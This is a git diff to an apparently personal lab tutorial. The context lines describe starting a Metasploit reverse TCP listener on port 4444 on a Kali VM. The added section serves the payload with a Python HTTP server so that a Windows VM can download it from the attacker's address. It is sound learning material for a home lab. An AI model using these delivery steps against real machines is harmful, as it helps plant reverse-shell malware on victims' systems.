@@ -97,3 +97,8 @@ To check the setup we can use "options" to view our changes.
 Lastly, to launch our reverse TCP listener we can type "exploit" into the terminal to start the handler on our Kali VM IP and our selected port number of 4444.
 <img width="793" height="518" alt="image" src="https://github.com/user-attachments/assets/cebac611-27d5-4fdb-9f5a-a6eee70b96f1" />
 
+---
+## Sending the payload to our WIndows VM
+- To send our payload we can use a HTTP server on Python.  
+On our Kali VM terminal we can type "python3 -m http.server 8888" using any unused port.  
+On our Windows VM, open a browser and type "http://192.168.0.200:8888" to access the web server where the payload is being hosted and download it.  
